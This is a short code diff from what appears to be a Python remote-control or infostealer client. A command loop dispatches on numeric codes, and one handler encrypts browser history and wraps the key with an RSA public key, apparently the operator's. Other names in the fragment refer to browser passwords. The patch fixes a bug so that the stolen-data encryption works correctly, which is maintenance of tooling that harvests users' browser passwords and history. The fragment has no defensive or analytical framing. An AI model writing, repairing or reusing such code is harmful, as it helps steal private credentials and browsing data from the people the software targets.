@@ -449,7 +449,7 @@ while True:
         elif int(float(command)) == -120590662:
             browser_history_AES = AES256()
 
-            ae_key15 = browser_password_AES.get_key()
+            ae_key15 = browser_history_AES.get_key()
             apubKey15 = RSA.import_key(known_hosts[0])
             encryptor15 = PKCS1_OAEP.new(apubKey15)
             e_key15 = encryptor15.encrypt(ae_key15)
